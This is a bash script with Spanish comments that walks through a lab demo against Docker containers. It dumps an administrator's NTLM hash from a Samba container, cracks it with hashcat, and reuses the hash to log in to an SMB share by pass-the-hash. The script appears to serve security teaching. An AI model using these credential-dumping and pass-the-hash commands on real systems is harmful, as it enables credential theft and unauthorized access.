#!/usr/bin/env bash
# Demo 4 — Extracción de hash NTLM y pass-the-hash
# Ejecutar desde el host, con el lab ya arrancado (docker compose up -d):
#   ./scripts/ntlm-pass-the-hash.sh

set -e
cd "$(dirname "$0")/.."
pause() { read -rp $'\n[Enter para continuar] '; }

echo "== 1) 'Volcado de SAM': extraemos el hash NTLM del usuario en target-samba =="
echo "    (simula que ya tienes acceso al equipo/controlador comprometido)"
docker compose exec -T target-samba pdbedit -L -w administrator | tee /tmp/pdbedit_out.txt
NTHASH=$(awk -F: '{print $4}' /tmp/pdbedit_out.txt)
echo "Hash NTLM extraído: $NTHASH"
pause

echo "== 2) Crackeando el hash NTLM con hashcat (-m 1000) =="
docker compose exec -T attacker bash -c "echo '$NTHASH' > /lab/hash_ntlm.txt && hashcat -a 0 -m 1000 /lab/hash_ntlm.txt /lab/wordlists/common-passwords.txt --quiet --force" || true
pause

echo "== 3) Pass-the-hash: autenticar en el recurso SMB SIN conocer la contraseña =="
echo "    (usamos directamente el hash NTLM extraído en el paso 1)"
docker compose exec -T attacker bash -c "smbclient -U administrator --pw-nt-hash //target-samba/shared -c 'ls' $NTHASH" \
  || docker compose exec -T attacker bash -c "smbclient -U 'administrator%${NTHASH}' --pw-nt-hash //target-samba/shared -c 'ls'"
echo
echo "Ni crackeado ni en claro: el hash solo ha bastado para entrar."
